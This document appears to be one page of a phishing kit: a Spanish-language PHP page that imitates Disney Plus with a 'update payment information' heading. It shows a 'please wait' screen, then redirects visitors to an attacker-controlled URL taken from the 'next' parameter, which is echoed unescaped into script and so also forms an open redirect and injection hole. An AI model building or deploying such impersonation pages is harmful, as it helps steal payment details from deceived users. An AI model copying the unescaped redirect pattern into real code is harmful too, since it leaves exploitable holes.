<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Disney plus</title>
    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
    <div class="left">
        <img src="res/logo.png">
    </div>
    <div class="right">
        <div class="legend">Actualizar información de pago</div>
    </div>
</header>

<main>
<div class="form" style="width:1000px; margin:0">

<div class="container w-100 m-0 p-4 text-center">
    <h4>Por favor espere...</h4>
    <p>No abandone esta página. Será redirigido automáticamente.</p>
</div>
 
<div class="container w-100 m-0 p-4 text-center">
    <img src="res/loading.gif" style="width:40px;">
</div>

</div>
</main>

<script>

let next = "<?= @$_GET['next']; ?>";

if(next!=""){
    setTimeout(() => {
        window.location=next;
    }, 6000);
}

</script>
</body>
</html>